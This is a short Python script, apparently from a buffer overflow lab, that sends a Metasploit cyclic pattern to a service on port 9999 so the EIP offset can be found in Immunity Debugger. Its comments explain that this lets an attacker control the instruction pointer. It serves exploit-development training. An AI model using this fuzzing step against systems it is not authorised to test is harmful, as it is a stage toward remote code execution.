#!/usr/bin/env python3

# Enumerate the EIP using this program, Immunity Debugger, and msf
# Open the program in Immunity Debugger and then run it
# Run this program
# Check EIP in Immunity Debugger
# Use msf-pattern_offset -q <EIP>
# This tells us how many bytes it takes to overflow the buffer
# When we overwrite this Instruction Pointer, we can then control what the application does next

import socket, sys

ip, port = "192.0.0.0", 9999
command = b""
timeout = 5

# second part of payload created with msf-pattern_create -l <amount of bytes that crashed string>
payload = b"".join([
    command, b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2"])

try:
    with socket.socket() as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        print(f"Sending buffer with {len(payload) - len(command)} bytes")
        s.send(payload + b"\r\n")
        print("Done!")
except:
    print("Could not connect.")